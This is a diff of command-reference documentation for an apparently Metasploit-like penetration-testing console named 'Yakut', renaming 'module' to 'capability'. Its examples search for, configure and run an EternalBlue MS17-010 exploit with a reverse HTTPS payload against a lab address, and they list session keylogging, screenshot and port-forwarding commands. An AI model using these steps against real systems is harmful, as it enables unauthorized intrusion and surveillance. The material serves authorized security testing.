@@ -1,10 +1,10 @@
 # Common Commands
 
 This section provides a detailed reference for the common commands used within the
-Yakut console. These commands allow you to manage workspaces, targets, modules, sessions,
+Yakut console. These commands allow you to manage workspaces, targets, capabilities, sessions,
 loot and the framework itself.
 
-_Tip: Remember to utilize the tab completion extensively in the Yakut console. It will help you discover commands, sub-commands, module paths and known values._
+_Tip: Remember to utilize the tab completion extensively in the Yakut console. It will help you discover commands, sub-commands, capability paths and known values._
 
 ## 1. Workspace Management Commands
 
@@ -156,23 +156,23 @@ yakut [ws:ACME_Corp_Internal] > target DC01 vulns add --name "MS17-010" --cve CV
 
 ## 3. Module Interaction Commands
 
-### `module search <keyword> [type:<type>] [platform:<platform>] [cve:<id>] [tag:<tag>] [name:<text>]`
+### `capability search <keyword> [type:<type>] [platform:<platform>] [cve:<id>] [tag:<tag>] [name:<text>]`
 
 ```console
-yakut > module search eternalblue type:exploit platform:windows
+yakut > cap search eternalblue type:exploit platform:windows
 [*] Modules matching 'eternalblue type:exploit platform:windows':
 RefName                                Title                          Reliability  Impact
 -------                                -----                          -----------  ------
 exploit/windows/smb/eternalblue_ms17010 MS17-010 EternalBlue SMB RCE   Excellent   Critical
 ```
 
-### `module info <module_refname>`
+### `capability info <capability_refname>`
 
 ```console
-yakut > module info exploit/windows/smb/eternalblue_ms17010
+yakut > capability info exploit/windows/smb/eternalblue_ms17010
 [*] Module Information: exploit/windows/smb/eternalblue_ms17010
   Title: MS17-010 EternalBlue SMB RCE
-  Description: This module exploits the MS17-010 vulnerability...
+  Description: This capability exploits the MS17-010 vulnerability...
   Authors: [NaughtyDev1, HackerGal2]
   License: MIT
   Platform: windows
@@ -200,14 +200,14 @@ yakut > module info exploit/windows/smb/eternalblue_ms17010
     ...
 ```
 
-### `module use <module_refname>` or `use <module_refname>`
+### `capability use <capability_refname>` or `use <capability_refname>`
 
 ```console
-yakut > module use exploit/windows/smb/eternalblue_ms17010
+yakut > cap use exploit/windows/smb/eternalblue_ms17010
 yakut [exploit/windows/smb/eternalblue_ms17010] >
 ```
 
-### `module options` or `options` (within module context)
+### `capability options` or `options` (within capability context)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > options
@@ -230,21 +230,21 @@ Module options (exploit/windows/smb/eternalblue_ms17010):
 
 ```
 
-### `module options set <OPTION_NAME> <value>` or `set <OPTION_NAME> <value>` (within module context)
+### `capability options set <OPTION_NAME> <value>` or `set <OPTION_NAME> <value>` (within capability context)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > set RHOSTS 10.10.10.150
 RHOSTS => 10.10.10.150
 ```
 
-### `module options payload <payload_refname>` or `set PAYLOAD <payload_refname>` (for exploit modules)
+### `capability options payload <payload_refname>` or `set PAYLOAD <payload_refname>` (for exploit capabilities)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > set PAYLOAD windows/x64/yakut_agent/reverse_https
 PAYLOAD => windows/x64/yakut_agent/reverse_https
 ```
 
-### `payload options` or `poptions` (within module context, after a payload is set)
+### `payload options` or `poptions` (within capability context, after a payload is set)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > payload options
@@ -256,14 +256,14 @@ Payload options (windows/x64/yakut_agent/reverse_https):
   ...
 ```
 
-### `payload options set <OPTION_NAME> <value>` or `pset <OPTION_NAME> <value>` (within module context)
+### `payload options set <OPTION_NAME> <value>` or `pset <OPTION_NAME> <value>` (within capability context)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > pset LHOST eth0
 LHOST => eth0
 ```
 
-### `module check` or `check` (within module context, if module supports it)
+### `capability check` or `check` (within capability context, if capability supports it)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > check
@@ -271,7 +271,7 @@ yakut [exploit/windows/smb/eternalblue_ms17010] > check
 [+] 10.10.10.150:445 - The target appears to be vulnerable to MS17-010 (EternalBlue).
 ```
 
-### `module run [--async]` or `run [--async]` or `exploit [--async]` (within module context)
+### `capability run [--async]` or `run [--async]` or `exploit [--async]` (within capability context)
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > run
@@ -281,19 +281,19 @@ yakut [exploit/windows/smb/eternalblue_ms17010] > run
 
 ### `back`
 
-Exits the current module (or session) context and returns to the previous context (usually global or workspace).
+Exits the current capability (or session) context and returns to the previous context (usually global or workspace).
 
 ```console
 yakut [exploit/windows/smb/eternalblue_ms17010] > back
 yakut [ws:ACME_Corp_Internal] >
 ```
 
-### `module reload_paths`
+### `capability reload_paths`
 
 ```console
-yakut > module reload_paths
-[*] Reloading modules from all paths...
-[+] Found 5 new modules.
+yakut > capability reload_paths
+[*] Reloading capabilities from all paths...
+[+] Found 5 new capabilities.
 ```
 
 ---
@@ -332,7 +332,7 @@ yakut [session:1 (10.10.10.150:yakut_agent)] >
 - `screenshot`: Take a screenshot of the target's desktop.
 - `keyscan_start` / `keyscan_dump` / `keyscan_stop`: Keylogger functionality.
 - `portfwd add -L <local_port> -r <remote_host> -p <remote_port>`: Setup port forwarding.
-- `module use post/...`: Load and run post-exploitation modules within the session context.
+- `capability use post/...`: Load and run post-exploitation capabilities within the session context.
 - `background` or `bg`: Background the current session and return to the previous Yakut context.
 - `close` or `exit`: Terminate the current session.
 
